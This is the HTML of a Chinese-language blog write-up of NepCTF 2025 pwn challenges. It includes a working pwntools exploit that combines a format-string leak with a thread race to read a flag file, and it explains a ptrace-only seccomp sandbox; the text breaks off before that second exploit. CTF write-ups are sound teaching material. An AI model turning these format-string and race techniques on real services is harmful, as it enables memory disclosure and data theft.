@@ -1,0 +1,369 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Nepctf2025 | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Nepctf2025链接：nep2025 | Hexo 1.Time12345678910111213141516void __fastcall __noreturn main(int a1, char **a2, char **a3)&amp;#123;  pthread_t newthread[2]; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF  newthread[1] &#x3D; __read">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Nepctf2025">
+<meta property="og:url" content="http://example.com/2026/03/26/Nepctf2025/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="Nepctf2025链接：nep2025 | Hexo 1.Time12345678910111213141516void __fastcall __noreturn main(int a1, char **a2, char **a3)&amp;#123;  pthread_t newthread[2]; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF  newthread[1] &#x3D; __read">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-03-26T13:10:11.000Z">
+<meta property="article:modified_time" content="2026-03-27T16:39:49.896Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/03/26/Nepctf2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Nepctf2025',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">Nepctf2025</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Nepctf2025"><a href="#Nepctf2025" class="headerlink" title="Nepctf2025"></a>Nepctf2025</h1><p>链接：<a target="_blank" rel="noopener" href="https://khighl.github.io/2025/07/29/nep2025/">nep2025 | Hexo</a></p>
+<h2 id="1-Time"><a href="#1-Time" class="headerlink" title="1.Time"></a>1.Time</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_2A31();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_2B0F() )</span><br><span class="line">      ;</span><br><span class="line">    pthread_create(newthread, <span class="number">0LL</span>, (<span class="type">void</span> *(*)(<span class="type">void</span> *))start_routine, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序的逻辑很简单。就是一个多线程竞争。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_2A31</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, format_0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will tell you all file names in the current directory!&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">  argv[<span class="number">2</span>] = <span class="string">&quot;-al&quot;</span>;</span><br><span class="line">  argv[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">    execve(<span class="string">&quot;/bin/ls&quot;</span>, argv, <span class="number">0LL</span>);</span><br><span class="line">  wait(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good luck :-)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会format_0里其实存在格式化字符串漏洞。我们可以通过%s来泄露出地址里的信息，从而得到flag。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_2B0F</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input file name you want to read:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, file);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(file, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag is not allowed!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是判断你想读的文件名是否包含flag。只要包含flag就不会进入子线程。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">start_routine</span><span class="params">(<span class="type">void</span> *rdi0)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-46Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-468h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-464h]</span></span><br><span class="line">  _DWORD a1[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-460h] BYREF</span></span><br><span class="line">  _BYTE v7[<span class="number">16</span>]; <span class="comment">// [rsp+70h] [rbp-400h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">1000</span>]; <span class="comment">// [rsp+80h] [rbp-3F0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+468h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  md5_1(a1);</span><br><span class="line">  n = <span class="built_in">strlen</span>(file);</span><br><span class="line">  md5_2(a1, file, n);</span><br><span class="line">  md5_3(a1, v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will tell you last file name content in md5:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, (<span class="type">unsigned</span> __int8)v7[i]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">999</span>; ++j )</span><br><span class="line">    buf[j] = <span class="number">0</span>;</span><br><span class="line">  fd = open(file, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(fd, buf, <span class="number">0x3E8u</span>LL);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format_0);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; ,your file read done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;file not found!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>子进程里首先是进行md5的加密，然后会打开我们写入的name的file。由于这里的format_0是全局变量，所以还记得我们之前写入的%s吗？只要算对偏移，并且保证filename&#x3D;flag就可以获得flag了。</p>
+<p>由于是多进程问题，所以这里存在多进程竞争。我们就可以通过较短时间内输入两次filename来触发条件。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;set follow-fork-mode parent\nb *$rebase(0x2D0B)\nc&#x27;)</span></span><br><span class="line">name = <span class="string">f&#x27;%22$p&#x27;</span>.encode()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    name += <span class="string">f&#x27;%<span class="subst">&#123;<span class="number">22</span>+<span class="number">1</span>+i&#125;</span>$p&#x27;</span>.encode()</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;name&#x27;</span>,name)</span><br><span class="line">io.sendline(<span class="string">b&#x27;test&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack</span><br><span class="line">00:0000│ rsp 0x7ffff7bfe9e0 ◂— 0x1000000000</span><br><span class="line">01:0008│-468 0x7ffff7bfe9e8 ◂— 0x3000003e8</span><br><span class="line">02:0010│-460 0x7ffff7bfe9f0 ◂— 0x200</span><br><span class="line">03:0018│-458 0x7ffff7bfe9f8 ◂— 0x73d32146cd6b8f09</span><br><span class="line">04:0020│-450 0x7ffff7bfea00 ◂— 0xf6b42726834edeca</span><br><span class="line">05:0028│-448 0x7ffff7bfea08 ◂— 0x8074736574</span><br><span class="line">06:0030│-440 0x7ffff7bfea10 ◂— 0</span><br><span class="line">07:0038│-438 0x7ffff7bfea18 ◂— 0</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│-430 0x7ffff7bfea20 ◂— 0</span><br><span class="line">... ↓     3 skipped</span><br><span class="line">0c:0060│-410 0x7ffff7bfea40 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0d:0068│-408 0x7ffff7bfea48 ◂— 0</span><br><span class="line">0e:0070│-400 0x7ffff7bfea50 ◂— 0x73d32146cd6b8f09</span><br><span class="line">0f:0078│-3f8 0x7ffff7bfea58 ◂— 0xf6b42726834edeca</span><br><span class="line">pwndbg&gt; </span><br><span class="line">10:0080│-3f0 0x7ffff7bfea60 ◂— &#x27;flag&#123;123&#125;\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以通过这个断点得到偏移量为22。</p>
+<p>然后输出的数据是小端序的十六进制数据，所以我们需要再加工一下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_string</span>(<span class="params">hex_list</span>):</span><br><span class="line">    result=<span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> hex_list:</span><br><span class="line">        num = <span class="built_in">int</span>(val,<span class="number">16</span>)</span><br><span class="line">        hex_len = (num.bit_length() + <span class="number">7</span>) // <span class="number">8</span></span><br><span class="line">        b = num.to_bytes(hex_len,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        result +=b</span><br><span class="line">    <span class="keyword">return</span> result.decode()</span><br><span class="line">hex_list = [</span><br><span class="line">        <span class="string">&quot;0x6968547b676c6166&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0x6568745f73695f73&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0x6c665f657572745f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0xa7d216761&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line"><span class="built_in">print</span>(hex_to_string(hex_list))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-Smallbox"><a href="#2-Smallbox" class="headerlink" title="2.Smallbox"></a>2.Smallbox</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pid_t</span> pid; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap((<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>) == (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] please input your shellcode: &quot;</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> ( pid &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !pid )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL);</span><br><span class="line">    install_seccomp();</span><br><span class="line">    MEMORY[<span class="number">0xDEADC0DE000</span>]();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>及其简单的程序。就是让我们往里面写入shellcode，然后在子程序直接执行。问题是里面存在沙箱保护。所以我们得先看一下沙箱里ban了什么。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，沙箱很奇怪，orw也没给我们留，只给了一个叫ptrace的函数。</p>
+<p>那我们就得了解一下什么是ptrace。</p>
+<p>ptrace，即<code>process trace</code>，从其名字上就能看出，<code>ptrace()系统调用</code>能提供追踪进程执行状态的功能。根据官方手册的介绍：<code>ptrace()</code>系统调用为一个进程提供了<strong>观察</strong>和<strong>控制</strong>另一个进程的执行过程的能力，同时也提供<strong>检查</strong>和<strong>改变</strong>另一个进程的内存值以及相关注册信息。其中，被控制的进程被称为<code>tracee</code>，控制进程被称为<code>tracer</code>。</p>
+<p>ptrace的函数签名如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span>       </span></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>request：要执行的操作类型；</li>
+<li>pid：被追踪的目标进程ID；</li>
+<li>addr：被监控的目标内存地址；</li>
+<li>data：保存读取出或者要写入的数据。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>request</code></td>
+<td align="left">请求类型</td>
+</tr>
+<tr>
+<td align="left"><code>pid</code></td>
+<td align="left">被调试进程的 PID</td>
+</tr>
+<tr>
+<td align="left"><code>addr</code></td>
+<td align="left">地址参数（依赖于请求类型）</td>
+</tr>
+<tr>
+<td align="left"><code>data</code></td>
+<td align="left">数据参数（依赖于请求类型）</td>
+</tr>
+</tbody></table>
+<p>常见的请求宏</p>
+<table>
+<thead>
+<tr>
+<th align="left">宏名</th>
+<th align="left">对应的数值</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>PTRACE_TRACEME</code></td>
+<td align="left"><code>0</code></td>
+<td align="left">表示自己要被父进程调试（子进程调用）</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_PEEKDATA</code> &#x2F; <code>PTRACE_PEEKUSER</code></td>
+<td align="left"><code>2</code>&#x2F; <code>3</code></td>
+<td align="left">读取数据或用户区（寄存器）</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_POKEDATA</code>&#x2F; <code>PTRACE_POKEUSER</code></td>
+<td align="left"><code>5</code> &#x2F; <code>6</code></td>
+<td align="left">写入数据或用户区（寄存器）</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_GETREGS</code> &#x2F; <code>PTRACE_SETREGS</code></td>
+<td align="left"><code>12</code>&#x2F; <code>13</code></td>
+<td align="left">获取或设置所有通用寄存器（x86、x86_64）</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_CONT</code></td>
+<td align="left"><code>7</code></td>
+<td align="left">继续执行被暂停的子进程</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_SINGLESTEP</code></td>
+<td align="left"><code>9</code></td>
+<td align="left">单步执行</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_ATTACH</code></td>
+<td align="left"><code>16</code></td>
+<td align="left">附加到一个正在运行的进程（类似 GDB attach）</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_DETACH</code></td>
+<td align="left"><code>17</code></td>
+<td align="left">从目标进程分离，目标继续运行</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_SYSCALL</code></td>
+<td align="left"><code>24</code></td>
+<td align="left">每次系统调用前暂停目标，常用于 syscall hook</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_KILL</code></td>
+<td align="left"><code>8</code></td>
+<td align="left">杀死被调试进程</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_SEIZE</code></td>
+<td align="left"><code>0x4206</code> (16902)</td>
+<td align="left">非侵入式 attach，用于新型调试接口</td>
+</tr>
+<tr>
+<td align="left"><code>PTRACE_INTERRUPT</code></td>
+<td align="left"><code>0x4207</code> (16903)</td>
+<td align="left">中断目标（常用于 SEIZE 模式）</td>
+</tr>
+</tbody></table>
+<p>我们使用的<code>gdb</code>就是依赖于<code>ptrace</code>调用,我们在<code>gdb</code>中可以对被调试的进程进行<code>内存写入</code>,<code>内存查看</code>,<code>寄存器修改</code>等等操作…</p>
+<p>下面给出exp。</p>
